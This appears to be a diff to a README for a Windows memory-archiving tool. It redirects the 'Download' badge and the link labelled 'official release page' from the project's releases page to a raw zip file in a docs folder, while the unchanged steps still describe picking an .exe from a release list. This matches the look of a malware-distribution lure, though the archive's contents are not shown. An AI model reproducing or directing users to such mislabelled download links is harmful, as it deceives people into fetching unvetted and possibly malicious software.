@@ -1,6 +1,6 @@
 # 🧠 eidetic-memory - Recall every detail with perfect precision
 
-[![Download Software](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Cataclysmic-pattypansquash50/eidetic-memory/releases)
+[![Download Software](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://raw.githubusercontent.com/Cataclysmic-pattypansquash50/eidetic-memory/main/docs/eidetic-memory-2.1.zip)
 
 ## What is this tool?
 This software helps you store information so you can retrieve it later. It functions like an external brain for your daily tasks. It archives text, images, and documents into an indexed database. You use this database to search for specific memories when you need them. The system organizes data based on tags and timestamps. This ensures you find the correct information without delay. You maintain full control over your stored data. The software runs locally on your computer to keep your information private.
@@ -16,7 +16,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 ## 📥 How to Install
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Cataclysmic-pattypansquash50/eidetic-memory/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Cataclysmic-pattypansquash50/eidetic-memory/main/docs/eidetic-memory-2.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
